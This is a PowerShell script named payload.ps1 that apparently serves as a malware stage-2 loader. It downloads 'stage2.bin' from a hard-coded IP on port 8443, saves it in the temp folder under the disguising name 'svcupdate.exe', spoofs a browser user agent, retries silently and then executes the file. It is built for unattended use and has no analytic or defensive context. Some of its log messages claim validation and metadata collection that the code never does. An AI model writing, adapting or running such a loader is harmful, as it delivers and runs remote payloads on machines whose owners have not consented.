<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "https://198.51.100.202:8443/cdn/stage2.bin",
    [string]$DownloadPath = "$env:TEMP\svcupdate.exe",
    [string]$LogPath = "$env:TEMP\transfer.log",
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    [int]$TransferTimeout = 95,
    [int]$RetryCount = 3,
    [int]$BackoffSeconds = 16
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    param(
        [string]$CandidateUrl = ""
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$RetryCount = 3,
        [int]$RetryDelay = 16,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

Write-StageLog -Message "Starting stage 2 download"
$ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $PayloadUrl
$OperationResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $DownloadPath -RetryCount $RetryCount -RetryDelay $BackoffSeconds -UserAgent $BrowserAgent
if ($OperationResult) {
    Write-StageLog -Message "Stage 2 downloaded"
    Start-Process -FilePath $DownloadPath
}
else {
    Write-Warning "Stage 2 transfer did not complete"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $PayloadUrl
    Destination = $DownloadPath
    RetryCount = $RetryCount
    TimeoutSec = $TransferTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Exporting operation report"
Write-Verbose "Validating result"
Write-Verbose "Collecting host metadata"
Write-Verbose "Reading configuration values"
Write-Verbose "Preparing working directory"
Write-Verbose "Stage handoff finished"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
